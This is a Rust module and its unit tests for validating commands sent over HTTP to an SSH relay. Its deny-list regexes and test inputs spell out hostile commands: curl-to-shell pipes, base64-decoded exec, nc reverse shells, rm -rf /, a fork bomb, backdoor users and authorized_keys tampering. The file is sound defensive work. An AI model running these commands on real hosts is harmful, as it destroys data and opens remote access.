//! API-mode command validation. This is the anti-abuse core of the relay:
//! a command submitted over HTTP must be *legal*, *non-destructive* and
//! *authorized for the account* before it ever reaches an SSH exec channel.
//!
//! Differences from the interactive terminal's `CommandSafetyChecker`:
//!
//! - The terminal checker can return `Warn` because a human sits in front of
//!   the confirm dialog. An unattended API client has no such step, so
//!   **every dangerous pattern is a hard Block here**.
//! - The API adds a stricter deny-list on top: shell and SSH abstractions
//!   (`eval`, command substitution is allowed but the inner text is checked
//!   too), network egress commands are fine, but anything touching block
//!   devices, process tables (`kill -9 1`), boot flow, or the SSH/auth
//!   configuration of the remote host is rejected.
//! - Per-account regex allowlists let the administrator confine an account
//!   to a positive command set (e.g. `^docker (ps|logs)`), which is far
//!   stronger than deny-listing alone.

use regex::Regex;
use rusterm_core::command_safety::{CommandSafetyChecker, SafetyVerdict};

use crate::command_guard::LoadedBlocklist;

/// Maximum accepted command length. Protects against absurd payloads and
/// keeps audit logs readable.
pub const MAX_COMMAND_LEN: usize = 4096;

#[derive(Debug, Clone, thiserror::Error)]
pub enum ValidationError {
    #[error("command is empty")]
    Empty,
    #[error("command exceeds {MAX_COMMAND_LEN} bytes")]
    TooLong,
    #[error("command contains NUL or control characters")]
    ControlChars,
    #[error("command is blocked by safety policy: {0}")]
    Dangerous(String),
    #[error("command is not in the account's allowlist")]
    NotAllowed,
    #[error("readonly account may only run non-mutating commands")]
    ReadonlyViolation,
}

/// One validator instance per relay; constructed once at startup.
///
/// The hardcoded patterns (`terminal_checker` + `api_patterns`) are the
/// **non-bypassable hard floor** — they always run first and cannot be
/// weakened by config. `extra_patterns` holds user/skill-contributed
/// patterns from `relay-blocklist.json`; they can only *add* restrictions.
pub struct CommandValidator {
    terminal_checker: CommandSafetyChecker,
    api_patterns: Vec<(Regex, &'static str)>,
    mutating_patterns: Vec<Regex>,
    /// User + skill patterns from `relay-blocklist.json`. Empty when no
    /// blocklist file is present (the common first-launch case).
    extra_patterns: Vec<crate::command_guard::CompiledPattern>,
}

impl std::fmt::Debug for CommandValidator {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CommandValidator")
            .field("hardcoded_api_patterns", &self.api_patterns.len())
            .field("extra_patterns", &self.extra_patterns.len())
            .finish_non_exhaustive()
    }
}

impl Default for CommandValidator {
    fn default() -> Self {
        Self::new()
    }
}

impl CommandValidator {
    pub fn new() -> Self {
        // Hard-block patterns for the unattended API. Everything the
        // terminal checker warns about is a block here; these are the API
        // extras.
        let api_raw: &[(&str, &str)] = &[
            // Killing init / kernel threads or every process at once.
            (
                r"\bkill(9|all)?\s+-(9|KILL)\s+(-1\b|1\b)",
                "kill init or all processes",
            ),
            (r"\bkillall\s+-(9|KILL)\b", "killall -9"),
            // Writing to memory or system devices.
            (
                r">\s*/dev/(k?mem|null2|port|core)\b",
                "write to system device",
            ),
            // Messing with mount/umount of system filesystems.
            (
                r"\b(mount|umount)\b[^;&|]*\s/(boot|sys|proc|dev|usr|etc|var)?\s*$",
                "mount/unmount of system path",
            ),
            // iptables flush / disabling the firewall remotely.
            (r"\biptables\s+-F", "flush firewall rules"),
            (
                r"\b(?:systemctl\s+(?:stop|disable|mask)\s+firewalld|ufw\s+disable)",
                "disable firewall",
            ),
            // Disabling SELinux.
            (r"\bsetenforce\s+0", "disable SELinux"),
            // Overwriting authorized_keys / sshd config remotely.
            (r"authorized_keys", "modifying SSH authorized_keys"),
            (
                r">\s*[^;&|]*\b(?:sshd_config|/etc/passwd|/etc/shadow|/etc/sudoers)",
                "overwriting system auth config",
            ),
            // Deleting or rewriting shell history is an anti-forensics
            // signal for abuse of the relay.
            (r"\bhistory\s+-c\b", "clearing shell history"),
            (r">\s*[^;&|]*\.\w*history\b", "truncating shell history"),
            // curl/wget piped directly into a shell download-and-execute —
            // the single most abused pattern on an open relay.
            (
                r"\b(?:curl|wget)\b[^;&|]*\|\s*(?:sudo\s+)?(?:ba|z|fi)?sh\b",
                "download-and-execute pipe into shell",
            ),
            // `eval` of untrusted text — defeats pattern checking.
            (r"\beval\s", "eval wrapper"),
            // Base64-blind execution: `echo <blob> | base64 -d | sh`.
            (
                r"base64\s+(-d|--decode)[^;&|]*\|\s*(?:sudo\s+)?(?:ba|z|fi)?sh\b",
                "base64-obfuscated shell exec",
            ),
            // User management.
            (
                r"\b(?:useradd|userdel|usermod|passwd)\b",
                "account management on remote host",
            ),
            // chmod/chown recursive on sensitive trees.
            (
                r"\b(?:chmod|chown|chgrp)\s+[^;&|]*-R[^;&|]*\s/(etc|boot|usr|lib|var|sys|proc|dev)\b",
                "recursive permission change on system tree",
            ),
            // Cron tampering.
            (r"\bcrontab\s+-[^l]", "crontab modification"),
            // Kernel modules.
            (
                r"\b(?:insmod|rmmod|modprobe\s+-r)\b",
                "kernel module load/unload",
            ),
            // Dangerous verbs hidden inside command substitution —
            // `$(rm -rf /)`, "`rm -rf /`". The terminal checker's `\brm`
            // pattern does not fire after `$(` because there is no word
            // boundary between `(` and `rm`'s `r` when preceded by `$`/`(`.
            (
                r"[$`][({ ]*(?:sudo[ 	]+)?(?:rm[ 	]+-[a-zA-Z]*[rf]|dd[ 	]|mkfs|shutdown|reboot|halt|poweroff)",
                "dangerous command inside command substitution",
            ),
        ];
        let api_patterns: Vec<(Regex, &'static str)> = api_raw
            .iter()
            .map(|(pat, reason)| {
                (
                    Regex::new(pat).unwrap_or_else(|e| panic!("invalid API regex {:?}: {e}", pat)),
                    *reason,
                )
            })
            .collect();

        // Patterns that classify a command as *mutating*. Used to enforce the
        // read-only account flag. This is coarse by design — false positives
        // (blocking a read) are safe; false negatives (allowing a write) are
        // not, so we lean towards "mutating".
        let mutating_defs: &[&str] = &[
            r"\b(?:rm|rmdir|mv|cp|install|touch|mkdir|ln|truncate)\b",
            r"\b(?:dd|mkfs|fdisk|parted|mount|umount)\b",
            r"\b(?:kill|pkill|killall)\b",
            r"\b(?:chmod|chown|chgrp|setfacl)\b",
            r"\b(?:apt|apt-get|yum|dnf|apk|pacman|pip|npm|cargo)\s+(?:install|remove|upgrade|update)\b",
            r"\bsystemctl\s+(?:start|stop|restart|reload|enable|disable|mask|unmask)\b",
            r"\bdocker\s+(?:run|rm|rmi|stop|start|restart|exec|build|pull|push|compose)\b",
            r"\bkubectl\s+(?:apply|delete|create|replace|patch|scale|rollout)\b",
            r"\bgit\s+(?:push|reset|checkout\s+-f|clean|commit|merge|rebase)\b",
            r">+\s*[^|]", // any output redirection
            r"\btee\b",
            r"\bsed\s+-i\b",
        ];
        let mutating_patterns: Vec<Regex> = mutating_defs
            .iter()
            .map(|pat| {
                Regex::new(pat).unwrap_or_else(|e| panic!("invalid mutating regex {:?}: {e}", pat))
            })
            .collect();

        Self {
            terminal_checker: CommandSafetyChecker::new(),
            api_patterns,
            mutating_patterns,
            extra_patterns: Vec::new(),
        }
    }

    /// Build a validator with additional user/skill-contributed patterns from
    /// `relay-blocklist.json`. The hardcoded catastrophic patterns always
    /// run first and cannot be weakened — `extra` can only *add* blocks.
    ///
    /// Invalid regexes in `extra` are already filtered out by
    /// [`BlocklistConfig::compile`](crate::command_guard::BlocklistConfig);
    /// callers should log `LoadedBlocklist::errors` before calling this so
    /// operators see what was skipped.
    pub fn with_blocklist(mut self, extra: LoadedBlocklist) -> Self {
        self.extra_patterns = extra.patterns;
        self
    }

    /// Number of extra (user/skill) patterns loaded. Mainly for diagnostics
    /// and startup logs.
    pub fn extra_pattern_count(&self) -> usize {
        self.extra_patterns.len()
    }

    /// Full validation for one submit. `allowlist` is the account's
    /// `allowed_commands` (empty = no extra restriction); `readonly` mirrors
    /// the account flag.
    pub fn validate(
        &self,
        command: &str,
        allowlist: &[Regex],
        readonly: bool,
    ) -> Result<(), ValidationError> {
        if command.is_empty() {
            return Err(ValidationError::Empty);
        }
        if command.len() > MAX_COMMAND_LEN {
            return Err(ValidationError::TooLong);
        }
        if command
            .chars()
            .any(|c| c.is_control() && c != '\t' && c != '\n' && c != '\r')
        {
            return Err(ValidationError::ControlChars);
        }

        // Hard blocks, terminal rules first (now fatal, no Warn escape).
        if let SafetyVerdict::Warn(reason) | SafetyVerdict::Block(reason) =
            self.terminal_checker.check(command)
        {
            return Err(ValidationError::Dangerous(reason));
        }
        for (regex, reason) in &self.api_patterns {
            if regex.is_match(command) {
                return Err(ValidationError::Dangerous((*reason).to_string()));
            }
        }

        // Read-only accounts: reject anything classified as mutating.
        if readonly && self.is_mutating(command) {
            return Err(ValidationError::ReadonlyViolation);
        }

        // Positive allowlist, when configured.
        if !allowlist.is_empty() && !allowlist.iter().any(|r| r.is_match(command)) {
            return Err(ValidationError::NotAllowed);
        }
        Ok(())
    }

    pub fn is_mutating(&self, command: &str) -> bool {
        self.mutating_patterns.iter().any(|r| r.is_match(command))
    }
}

/// Compile an account's `allowed_commands` string list into regexes.
/// Invalid patterns are reported with their index so the UI can flag them.
pub fn compile_allowlist(patterns: &[String]) -> Result<Vec<Regex>, Vec<(usize, String)>> {
    let mut ok = Vec::with_capacity(patterns.len());
    let mut errors = Vec::new();
    for (idx, pat) in patterns.iter().enumerate() {
        match Regex::new(pat) {
            Ok(r) => ok.push(r),
            Err(e) => errors.push((idx, e.to_string())),
        }
    }
    if errors.is_empty() {
        Ok(ok)
    } else {
        Err(errors)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn validator() -> CommandValidator {
        CommandValidator::new()
    }

    fn ok(cmd: &str) {
        validator()
            .validate(cmd, &[], false)
            .unwrap_or_else(|e| panic!("expected ok for {cmd:?}, got {e}"));
    }

    fn blocked(cmd: &str) -> ValidationError {
        validator()
            .validate(cmd, &[], false)
            .err()
            .unwrap_or_else(|| panic!("expected block for {cmd:?}"))
    }

    #[test]
    fn benign_commands_pass() {
        ok("ls -la /var/log");
        ok("docker ps -a");
        ok("systemctl status nginx");
        ok("df -h && uptime");
        ok("grep ERROR /var/log/app.log | tail -20");
        ok("cat /proc/cpuinfo | head");
    }

    #[test]
    fn empty_and_oversized() {
        assert!(matches!(blocked(""), ValidationError::Empty));
        let long = "a".repeat(MAX_COMMAND_LEN + 1);
        assert!(matches!(blocked(&long), ValidationError::TooLong));
    }

    #[test]
    fn control_characters_rejected() {
        // ESC byte could smuggle terminal control sequences through exec.
        assert!(matches!(
            blocked("ls \u{1b}[2J"),
            ValidationError::ControlChars
        ));
    }

    #[test]
    fn terminal_rules_become_hard_blocks() {
        // Every pattern the interactive checker *warns* about is fatal here.
        for cmd in [
            "rm -rf /",
            "rm -rf /*",
            "rm -rf ~",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "echo x > /dev/sdb",
            ":(){ :|:& };:",
            "chmod -R 777 /",
            "shutdown -h now",
            "reboot",
        ] {
            assert!(
                matches!(blocked(cmd), ValidationError::Dangerous(_)),
                "expected Dangerous for {cmd:?}"
            );
        }
    }

    #[test]
    fn api_specific_blocks() {
        assert!(matches!(
            blocked("curl http://x/y.sh | sh"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("curl http://x/y.sh | sudo bash"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("wget -qO- http://x | sh"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("echo aGk= | base64 -d | sh"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("eval \"$PAYLOAD\""),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("kill -9 1"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("killall -9"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("iptables -F"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("systemctl stop firewalld"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("setenforce 0"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("echo key >> ~/.ssh/authorized_keys"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("echo x > /etc/sshd_config"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("history -c"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("useradd backdoor"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("chmod -R 777 /etc"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("crontab -r"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("rmmod foo"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("umount /etc"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn readonly_accounts_blocked_from_mutations() {
        let v = validator();
        for cmd in [
            "rm -f /tmp/x",
            "docker stop web",
            "systemctl restart nginx",
            "echo hi > /tmp/f",
            "sed -i s/a/b/ f",
            "kill 1234",
        ] {
            assert!(
                matches!(
                    v.validate(cmd, &[], true),
                    Err(ValidationError::ReadonlyViolation)
                ),
                "expected ReadonlyViolation for {cmd:?}"
            );
        }
        // but reads are fine
        v.validate("docker ps", &[], true).unwrap();
        v.validate("systemctl status nginx", &[], true).unwrap();
        v.validate("git log --oneline -5", &[], true).unwrap();
    }

    #[test]
    fn allowlist_enforced_when_present() {
        let v = validator();
        let allow = compile_allowlist(&[r"^docker\s+(ps|logs|stats)\b".to_string()]).unwrap();
        assert!(v.validate("docker ps -a", &allow, false).is_ok());
        assert!(
            v.validate("docker logs web --tail 10", &allow, false)
                .is_ok()
        );
        assert!(matches!(
            v.validate("apt update", &allow, false),
            Err(ValidationError::NotAllowed)
        ));
        assert!(matches!(
            v.validate("ls", &allow, false),
            Err(ValidationError::NotAllowed)
        ));
    }

    #[test]
    fn denylist_beats_allowlist() {
        // Even if an admin foolishly allows `.*`, hard blocks still win.
        let v = validator();
        let allow = compile_allowlist(&[".*".to_string()]).unwrap();
        assert!(matches!(
            v.validate("rm -rf /", &allow, false),
            Err(ValidationError::Dangerous(_))
        ));
    }

    #[test]
    fn injection_variants_blocked() {
        // Chaining with separators cannot smuggle dangerous commands.
        blocked("ls; rm -rf /");
        blocked("ls && rm -rf /");
        assert!(matches!(
            blocked("$(rm -rf /)"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("`rm -rf /`"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn compile_allowlist_reports_bad_pattern() {
        let err = compile_allowlist(&["ok".to_string(), "[bad(".to_string()]).unwrap_err();
        assert_eq!(err.len(), 1);
        assert_eq!(err[0].0, 1);
    }

    // ── New hardcoded patterns (long-form flags, find -delete, etc.) ───────

    #[test]
    fn rm_long_form_recursive_force_root_is_caught() {
        // GNU long options: `rm --recursive --force /` should not slip past.
        assert!(matches!(
            blocked("rm --recursive --force /"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("rm --force --recursive /"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("rm --recursive --force /*"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn find_delete_on_root_is_caught() {
        assert!(matches!(
            blocked("find / -delete"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("find / -name '*.log' -delete"),
            ValidationError::Dangerous(_)
        ));
        // find on a subdir is fine (not catastrophic at the API level — the
        // readonly check or allowlist handles scope).
        ok("find /var/log -name '*.gz' -delete");
    }

    #[test]
    fn chmod_000_root_is_caught() {
        assert!(matches!(
            blocked("chmod 000 /"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("chmod -R 0000 /"),
            ValidationError::Dangerous(_)
        ));
        // chmod 000 on a subdir is not catastrophic at this layer.
        ok("chmod 000 /tmp/scratch");
    }

    #[test]
    fn chown_recursive_root_is_caught() {
        assert!(matches!(
            blocked("chown -R nobody /"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("chown -R nobody:nobody / ;"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn systemctl_poweroff_is_caught() {
        for cmd in ["systemctl poweroff", "systemctl reboot", "systemctl halt"] {
            assert!(
                matches!(blocked(cmd), ValidationError::Dangerous(_)),
                "expected Dangerous for {cmd:?}"
            );
        }
    }

    #[test]
    fn telinit_shutdown_runlevel_is_caught() {
        assert!(matches!(blocked("telinit 0"), ValidationError::Dangerous(_)));
        assert!(matches!(blocked("telinit 6"), ValidationError::Dangerous(_)));
    }

    #[test]
    fn sysrq_trigger_is_caught() {
        assert!(matches!(
            blocked("echo b > /proc/sysrq-trigger"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("> /proc/sysrq-trigger"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn nsenter_into_pid1_is_caught() {
        assert!(matches!(
            blocked("nsenter --target 1 --mount --uts --ipc --net bash"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn pivot_root_on_root_is_caught() {
        assert!(matches!(
            blocked("pivot_root / /oldroot"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn cat_zero_into_block_device_is_caught() {
        assert!(matches!(
            blocked("cat /dev/zero > /dev/sda"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn fork_bomb_named_function_variant_is_caught() {
        assert!(matches!(
            blocked("f(){ f|f& };f"),
            ValidationError::Dangerous(_)
        ));
    }

    // ── Evasion attempts that MUST still be caught ────────────────────────

    #[test]
    fn rm_rf_with_sudo_is_caught() {
        // sudo prefix must not evade the terminal checker's `\brm` pattern.
        assert!(matches!(
            blocked("sudo rm -rf /"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn rm_rf_with_extra_spaces_is_caught() {
        assert!(matches!(
            blocked("rm  -rf  /"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn rm_rf_piped_is_caught() {
        assert!(matches!(blocked("rm -rf / | cat"), ValidationError::Dangerous(_)));
    }

    #[test]
    fn rm_rf_after_and_is_caught() {
        assert!(matches!(
            blocked("true && rm -rf /"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn rm_rf_after_semicolon_is_caught() {
        assert!(matches!(blocked("ls; rm -rf /"), ValidationError::Dangerous(_)));
    }

    // ── User/skill blocklist integration ───────────────────────────────────

    fn validator_with_extra(extra: &[(&str, &str, &'static str)]) -> CommandValidator {
        // extra: (regex, reason, source) — source is "user" or "skill".
        let mut patterns = Vec::new();
        for (regex, reason, source) in extra {
            patterns.push(crate::command_guard::CompiledPattern {
                regex: Regex::new(regex).unwrap(),
                reason: reason.to_string(),
                source,
            });
        }
        CommandValidator::new().with_blocklist(crate::command_guard::LoadedBlocklist {
            patterns,
            errors: Vec::new(),
        })
    }

    #[test]
    fn user_blocklist_pattern_rejects_matching_command() {
        let v = validator_with_extra(&[
            (r"\bnc\s+-e", "reverse shell via nc", "user"),
        ]);
        // Benign command passes.
        assert!(v.validate("ls -la", &[], false).is_ok());
        // User-blocked command is rejected with the user's reason.
        match v.validate("nc -e /bin/sh 10.0.0.1 4444", &[], false) {
            Err(ValidationError::Dangerous(reason)) => {
                assert!(reason.contains("reverse shell"));
            }
            other => panic!("expected Dangerous, got {other:?}"),
        }
    }

    #[test]
    fn skill_blocklist_pattern_carries_attribution() {
        let v = validator_with_extra(&[
            (r"\bDROP\s+DATABASE", "DROP DATABASE via skill", "skill"),
        ]);
        match v.validate("psql -c 'DROP DATABASE prod'", &[], false) {
            Err(ValidationError::Dangerous(reason)) => {
                // The reason is the skill-contributed string; the source
                // attribution is baked in at compile time.
                assert!(reason.contains("DROP DATABASE"));
            }
            other => panic!("expected Dangerous, got {other:?}"),
        }
    }

    #[test]
    fn hard_floor_cannot_be_weakened_by_user_pattern() {
        // A malicious or naive user pattern ".*" (match everything → "allow
        // all") must NOT weaken the hardcoded catastrophic blocks. The hard
        // floor runs first and wins.
        //
        // Note: user patterns can only ADD blocks, never remove them — there
        // is no "allow" concept in the blocklist, only "block". This test
        // documents that even an absurdly broad user pattern doesn't open a
        // hole for rm -rf /.
        let v = validator_with_extra(&[
            // A user pattern that matches "rm -rf /" too — but the hard floor
            // already catches it first, so the user reason is irrelevant.
            (r"rm", "user also blocks rm", "user"),
        ]);
        // rm -rf / is caught by the hard floor (terminal checker), not the
        // user pattern. The reason should be the terminal checker's, not the
        // user's.
        match v.validate("rm -rf /", &[], false) {
            Err(ValidationError::Dangerous(reason)) => {
                assert!(
                    !reason.contains("user also blocks rm"),
                    "hard floor must fire before user pattern; got user reason: {reason}"
                );
            }
            Ok(()) => panic!("rm -rf / must be blocked"),
            other => panic!("expected Dangerous, got {other:?}"),
        }
    }

    #[test]
    fn extra_pattern_count_reports_loaded_patterns() {
        let v = validator_with_extra(&[
            (r"\bnc\s+-e", "nc", "user"),
            (r"\bDROP\s+DATABASE", "drop", "skill"),
        ]);
        assert_eq!(v.extra_pattern_count(), 2);
    }

    #[test]
    fn empty_blocklist_is_no_op() {
        let v = CommandValidator::new().with_blocklist(crate::command_guard::LoadedBlocklist {
            patterns: Vec::new(),
            errors: Vec::new(),
        });
        // Benign commands still pass.
        assert!(v.validate("ls -la", &[], false).is_ok());
        // Catastrophic commands are still blocked by the hard floor.
        assert!(matches!(
            v.validate("rm -rf /", &[], false),
            Err(ValidationError::Dangerous(_))
        ));
        assert_eq!(v.extra_pattern_count(), 0);
    }

    #[test]
    fn user_pattern_does_not_block_benign_commands() {
        let v = validator_with_extra(&[
            (r"\bnc\s+-e\b", "reverse shell", "user"),
        ]);
        // Commands that don't match the user pattern still pass.
        assert!(v.validate("docker ps", &[], false).is_ok());
        assert!(v.validate("nc -zv 10.0.0.1 4444", &[], false).is_ok()); // -z, not -e
    }

    #[test]
    fn denylist_beats_allowlist_even_with_extra_patterns() {
        // Hard floor + extra patterns all run before the allowlist. An
        // account with a permissive allowlist (".*") still can't run rm -rf /
        // or a user-blocked command.
        let v = validator_with_extra(&[
            (r"\bnc\s+-e\b", "reverse shell", "user"),
        ]);
        let allow = compile_allowlist(&[".*".to_string()]).unwrap();
        assert!(matches!(
            v.validate("rm -rf /", &allow, false),
            Err(ValidationError::Dangerous(_))
        ));
        assert!(matches!(
            v.validate("nc -e /bin/sh 1.2.3.4 5", &allow, false),
            Err(ValidationError::Dangerous(_))
        ));
        // A benign command passes both the hard floor and the allowlist.
        assert!(v.validate("ls", &allow, false).is_ok());
    }
}
